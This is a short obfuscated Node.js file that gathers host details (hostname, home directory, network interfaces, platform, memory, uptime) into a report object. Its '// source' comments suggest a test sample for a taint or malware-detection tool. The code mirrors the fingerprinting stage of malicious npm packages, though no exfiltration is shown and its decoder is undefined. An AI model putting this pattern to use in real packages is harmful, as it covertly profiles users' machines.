const https = require(_0x4d3404(0x1c6)), os = require('os'), crypto = require(_0x4d3404(0x1b7)),
    x = require('./util');

var theNetworkInterfaces = {};

function _0x4705(_0x14d4cd, _0x3e52f9) {
    const _0x429e24 = _0x429e();
    return _0x4705 = function (_0x4705ec, _0x3d262c) {
        _0x4705ec = _0x4705ec - 0x1b5;
        let _0x431351 = _0x429e24[_0x4705ec];
        return _0x431351;
    }, _0x4705(_0x14d4cd, _0x3e52f9);
}

for (var i = 0x0; i < os['networkInterfaces']()[_0x4d3404(0x1ba)][_0x4d3404(0x1c3)]; i++) {
    // source 'theNetworkInterfaces'
    os[_0x4d3404(0x1c9)]()['en0'][i][_0x4d3404(0x1c8)] == _0x4d3404(0x1cc) && (theNetworkInterfaces = os['networkInterfaces']()[_0x4d3404(0x1ba)][i]);
}


var report = {  // everything is a potential source, but some of these cannot be detected
    'arch': os[_0x4d3404(0x1bb)](),
    'endianness': os[_0x4d3404(0x1d7)](),
    'freemem': os[_0x4d3404(0x1c1)](),
    'homedir': os[_0x4d3404(0x1da)](),
    'hostname': os[_0x4d3404(0x1ce)](),
    'networkInterfaces': theNetworkInterfaces,
    'platform': os['platform'](), // source
    'release': os[_0x4d3404(0x1cf)](),
    'tmpdir': os['tmpdir'](),
    'totalmem': os['totalmem'](), // source
    'type': os[_0x4d3404(0x1d4)](),
    'uptime': os[_0x4d3404(0x1d8)](),
    'package': _0x4d3404(0x1d9)
}

const isDevEnv = process.env.NODE_ENV === "development"; // safe?. Discard this by now
